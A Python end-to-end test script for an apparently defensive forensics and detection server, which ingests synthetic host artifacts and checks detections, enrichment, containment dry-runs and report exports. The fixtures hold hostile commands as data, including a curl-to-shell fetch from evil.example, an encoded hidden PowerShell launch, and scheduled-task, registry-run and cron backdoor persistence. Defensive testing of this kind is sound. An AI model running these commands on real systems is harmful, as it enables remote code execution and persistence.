import hashlib
import json
import os
import subprocess
import sys
import tempfile
import time
import urllib.request
from datetime import datetime, timezone

PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, PROJECT_ROOT)

SERVER_PORT = int(os.environ.get("ATOR_E2E_PORT", "8765"))
BASE = f"http://127.0.0.1:{SERVER_PORT}"
server_proc = None


def api(method, path, body=None, headers=None):
    req = urllib.request.Request(BASE + path, method=method)
    req.add_header("Content-Type", "application/json")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    data = json.dumps(body).encode() if body is not None else None
    with urllib.request.urlopen(req, data=data, timeout=60) as resp:
        return resp.status, json.loads(resp.read().decode() or "{}")


def wait_health(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status, _ = api("GET", "/health")
            if status == 200:
                return True
        except Exception:
            time.sleep(0.5)
    return False


def start_server():
    global server_proc
    env = dict(os.environ)
    db_path = os.path.join(tempfile.mkdtemp(prefix="ator_e2e_"), "e2e.db")
    env["ATOR_DFIR_DB"] = db_path
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONPATH"] = PROJECT_ROOT + os.pathsep + env.get("PYTHONPATH", "")
    diag = subprocess.run(
        [sys.executable, "-c",
         "import os,sys;print('cwd='+os.getcwd());print('path0='+repr(sys.path[:3]))"],
        cwd=PROJECT_ROOT, env=env, capture_output=True, text=True,
    )
    print(f"[diag] {diag.stdout.strip()} stderr={diag.stderr[-200:]!r}")
    server_proc = subprocess.Popen(
        [sys.executable, "-m", "uvicorn", "server.app:app",
         "--host", "127.0.0.1", "--port", str(SERVER_PORT)],
        cwd=PROJECT_ROOT, env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, encoding="utf-8", errors="replace",
    )
    deadline = time.time() + 30
    while time.time() < deadline:
        if server_proc.poll() is not None:
            out = server_proc.stdout.read() if server_proc.stdout else ""
            raise RuntimeError(f"server exited early rc={server_proc.returncode}\n{out[-3000:]}")
        try:
            status, _ = api("GET", "/health")
            if status == 200:
                break
        except Exception:
            time.sleep(0.5)
    else:
        out = server_proc.stdout.read() if server_proc.stdout else ""
        raise RuntimeError(f"server failed to become healthy\n{out[-3000:]}")
    print(f"[OK] server up on {BASE} (db={db_path})")
    return db_path


def make_manifest(collection_id, hostname, os_type):
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
    manifest = {
        "collection_id": collection_id, "hostname": hostname, "os_type": os_type,
        "agent_version": "1.0.0-e2e", "started_at_utc": ts,
        "finished_at_utc": ts,
        "collector_order": ["network", "processes", "persistence", "logs",
                            "files_triage", "containers"],
    }
    manifest["manifest_sha256"] = hashlib.sha256(
        json.dumps(manifest, sort_keys=True, default=str).encode()).hexdigest()
    return manifest


def enroll(hostname, os_type, docker_flag=0):
    status, body = api("POST", "/api/v1/enroll", {
        "hostname": hostname, "os_type": os_type, "docker_engine_flag": docker_flag,
        "agent_version": "1.0.0-e2e",
    })
    assert status == 200, body
    print(f"[OK] enrolled {hostname} ({os_type}) client_id={body['client_id']}")
    return body


def ingest(enrollment, collection_id, hostname, os_type, artifacts, docker_flag=0):
    headers = {
        "Authorization": "Bearer " + enrollment["api_key"],
        "X-Client-ID": enrollment["client_id"],
    }
    payload = {
        "manifest": make_manifest(collection_id, hostname, os_type),
        "artifacts": artifacts,
    }
    status, body = api("POST", "/api/v1/ingest", payload, headers=headers)
    assert status == 202, body
    print(f"[OK] ingested {collection_id} ({sum(len(v) for v in artifacts.values())} artifacts)")


def main():
    results = []

    def check(label, ok, extra=""):
        results.append((label, ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] {label} {extra}")

    start_server()
    try:
        win = enroll("ator-win10-host", "windows")
        lin = enroll("ator-ubuntu-vm", "linux")
        dock = enroll("ator-docker-host", "docker_host", docker_flag=1)

        print("\n=== Phase 1: real Windows agent collection ===")
        cfg = {
            "server_url": BASE, "api_key": win["api_key"], "client_id": win["client_id"],
            "spool_dir": os.path.join(tempfile.mkdtemp(), "spool"),
            "max_events_per_source": 50, "max_files": 15, "max_file_bytes": 100000,
            "enable_local_yara": True,
        }
        from agent import agent as agent_mod
        agent_mod.cfg_path_override = None
        old_argv = sys.argv
        sys.argv = ["agent.py", "once"]
        import io
        from contextlib import redirect_stdout
        buf = io.StringIO()
        orig_load = agent_mod.load_config
        agent_mod.load_config = lambda config_path=None: dict(cfg)
        try:
            with redirect_stdout(buf):
                rc = agent_mod.main()
        finally:
            sys.argv = old_argv
            agent_mod.load_config = orig_load
        out = json.loads(buf.getvalue().strip().splitlines()[-1])
        check("windows_agent_live_collection_sent", out.get("status") == "sent", str(out))

        print("\n=== Phase 1.5: simulated attack artifacts on Windows host (ART-style) ===")
        ingest(win, "win-atk-001", "ator-win10-host", "windows", {
            "processes": [
                {"pid": 4100, "ppid": 500, "name": "powershell.exe",
                 "cmdline": r"powershell.exe -nop -w hidden -enc SQBFAFgAKQAgAA==",
                 "exe_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"},
                {"pid": 4101, "ppid": 4100, "name": "whoami.exe",
                 "cmdline": "whoami.exe /priv", "exe_path": r"C:\Windows\System32\whoami.exe"},
                {"pid": 4102, "ppid": 4100, "name": "schtasks.exe",
                 "cmdline": r"schtasks.exe /create /tn AtorPersist /tr cmd.exe /sc once",
                 "exe_path": r"C:\Windows\System32\schtasks.exe"},
                {"pid": 4103, "ppid": 500, "name": "explorer.exe",
                 "cmdline": None, "exe_path": r"C:\Windows\explorer.exe"},
            ],
            "network": [
                {"pid": 4100, "process_name": "powershell.exe",
                 "remote": "198.51.100.23:4444", "proto": "tcp",
                 "status": "established", "local": "10.0.0.2:51000"},
            ],
            "persistence": [
                {"ptype": "registry_run", "name": "AtorUpdater",
                 "command": r"reg add HKCU\...\Run /v up /d evil.exe", "location": "HKCU\\...\\Run"},
            ],
            "files_triage": [], "logs": [], "containers": [],
        })

        print("\n=== Phase 2: synthetic Linux endpoint artifacts ===")
        ingest(lin, "lin-col-001", "ator-ubuntu-vm", "linux", {
            "processes": [
                {"pid": 2001, "ppid": 1500, "name": "bash",
                 "cmdline": "bash -c 'curl http://evil.example/x.sh | sh'",
                 "exe_path": "/usr/bin/bash", "sha256": None, "username": "root"},
                {"pid": 2002, "ppid": 2001, "name": "curl",
                 "cmdline": "curl http://evil.example/x.sh", "exe_path": "/usr/bin/curl"},
                {"pid": 2003, "ppid": 1500, "name": "sshd", "cmdline": "sshd -D",
                 "exe_path": "/usr/sbin/sshd"},
            ],
            "network": [
                {"pid": 2001, "process_name": "bash", "remote": "203.0.113.66:4444",
                 "proto": "tcp", "status": "established", "local": "10.0.0.9:55000"},
            ],
            "persistence": [{"ptype": "cron", "name": "backdoor",
                             "command": "* * * * * /tmp/.x/update", "location": "/etc/cron.d/backdoor"}],
            "files_triage": [], "logs": [
                {"source": "auth", "event_time_utc": "2026-08-20T09:59:00+00:00",
                 "payload_json": {"message": "Failed password for root from 203.0.113.66"}},
            ], "containers": [],
        })

        print("\n=== Phase 3: synthetic Docker host artifacts ===")
        ingest(dock, "dock-col-001", "ator-docker-host", "docker_host", {
            "processes": [],
            "network": [],
            "persistence": [],
            "files_triage": [],
            "logs": [],
            "containers": [
                {"record": "inventory", "container_id": "abc123def456",
                 "container_name": "suspicious-miner", "image_name": "ubuntu:latest",
                 "status": "Up 2 hours", "ip_address": "172.17.0.2"},
                {"record": "port_mapping", "container_id": "abc123def456",
                 "host_port": 4444, "container_port": 4444, "container_name": "suspicious-miner"},
            ],
        }, docker_flag=1)

        print("\n=== Phase 4: detection engine + enrichment ===")
        status, engine = api("POST", "/api/v1/engine/run")
        assert status == 200, engine
        print(f"[OK] engine run: {json.dumps({k: engine[k] for k in ('sigma_hits', 'total_new_detections')})}")
        time.sleep(1)

        status, dets = api("GET", "/api/v1/detections")
        names = {d["rule_name"]: d for d in dets}
        check("sigma_powershell_encoded_fired", any("Encoded Command" in n for n in names))
        check("sigma_reverse_shell_port_fired", any("Reverse Shell" in n for n in names))
        check("sigma_linux_pipe_shell_fired", any("Piped to Shell" in n or "Curl" in n for n in names))
        enriched = [d for d in dets if d.get("technique_name")]
        check("mitre_enrichment_attached", len(enriched) >= 2,
              f"{len(enriched)} enriched")
        ps_det = next((d for d in dets if "Encoded Command" in d["rule_name"]), None)
        check("t1059_001_detected_and_enriched",
              bool(ps_det) and ps_det.get("technique_id") == "T1059.001"
              and ps_det.get("technique_name") == "PowerShell")

        win_id = win["host_id"]
        status, soc = api("GET", f"/api/v1/soc/{win_id}")
        stages = [s["tactic"] for s in soc["chain"]]
        check("soc_chain_built_for_windows", len(stages) >= 1, f"stages={stages}")

        status, tl = api("GET", "/api/v1/timeline", )
        tl_win = api("GET", f"/api/v1/timeline?host_id={win_id}")[1]
        dts = [e["_dt"] for e in tl_win["events"] if e.get("_dt")]
        check("timeline_sorted_utc", dts == sorted(dts))

        print("\n=== Phase 5: containment dry-run workflow ===")
        api("POST", "/api/v1/policies", {"name": "e2e-auto", "min_severity": "high", "mode": "approve"})
        # scan_history applies the freshly created policy to recent detections
        # (the engine otherwise only evaluates genuinely new findings).
        api("POST", "/api/v1/engine/run?scan_history=true")
        status, pending = api("GET", "/api/v1/approvals")
        check("approval_created_by_policy", len(pending) >= 1, f"pending={len(pending)}")
        if pending:
            status, decision = api("POST", f"/api/v1/approvals/{pending[0]['id']}/decide",
                                   {"decision": "approved", "analyst": "e2e"})
            check("dry_run_containment_logged", "DRY-RUN" in decision["result"]["mode"])

        print("\n=== Phase 6: reports & exports ===")
        pdf_resp = urllib.request.urlopen(f"{BASE}/api/v1/export/report/{win_id}.pdf", timeout=60)
        pdf_head = pdf_resp.read(8)
        check("pdf_report_generated", b"%PDF" in pdf_head)
        status, js = api("GET", f"/api/v1/export/report/{win_id}.json")
        check("json_report_valid", bool(js["risk"]["verdict"]))
        status, stix = api("GET", f"/api/v1/export/stix/{win_id}.json")
        check("stix21_bundle_valid", stix.get("type") == "bundle")
        status, nav = api("GET", "/api/v1/export/navigator.json")
        tids = {t["techniqueID"] for t in nav["techniques"]}
        check("navigator_layer_has_techniques", "T1059.001" in tids, f"{sorted(tids)}")

        print("\n=== Phase 7: dashboard pages ===")
        for page in ("/", "/investigation", "/endpoints", "/containment", "/intel", "/reports"):
            r = urllib.request.urlopen(BASE + page, timeout=30)
            check(f"ui_{page.strip('/').replace('/', '_')}_renders", r.status == 200)

        passed = sum(1 for _, ok in results if ok)
        total = len(results)
        print(f"\n{'='*60}")
        print(f"E2E RESULT: {passed}/{total} checks passed")
        print(f"{'='*60}")
        for label, ok in results:
            if not ok:
                print(f"  FAILED: {label}")
        return 0 if passed == total else 1
    finally:
        if server_proc:
            server_proc.terminate()
            try:
                out = server_proc.communicate(timeout=10)[0].decode(errors="replace")
                tail = "\n".join(out.splitlines()[-12:])
                print(f"\n--- server log tail ---\n{tail}")
            except Exception:
                server_proc.kill()


if __name__ == "__main__":
    sys.exit(main())
